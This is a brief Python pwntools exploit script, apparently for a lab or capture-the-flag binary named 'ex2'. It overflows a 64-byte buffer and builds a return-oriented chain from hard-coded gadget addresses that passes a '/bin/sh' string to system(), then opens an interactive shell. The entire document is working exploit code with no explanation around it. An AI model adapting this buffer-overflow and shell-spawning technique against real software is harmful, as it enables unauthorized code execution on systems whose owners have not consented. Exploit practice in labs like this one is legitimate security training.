from pwn import *

p = process('./bin/ex2')

pop_rsi_pop_rdi_pop_rbp_ret = 0x4012b4
pop_rdi_pop_rbp_ret = 0x4012b5
deep_sleep_system_addr = 0x401090
ret_address = 0x40101a

buffer_size = 64
padding = b'A' * buffer_size

payload = b"/bin/sh\0" + padding + p64(pop_rdi_pop_rbp_ret) + p64(0x404060) + p64(0x0) + p64(deep_sleep_system_addr)

# gdb.attach(p)
# pause()

p.sendline(payload)
p.interactive()
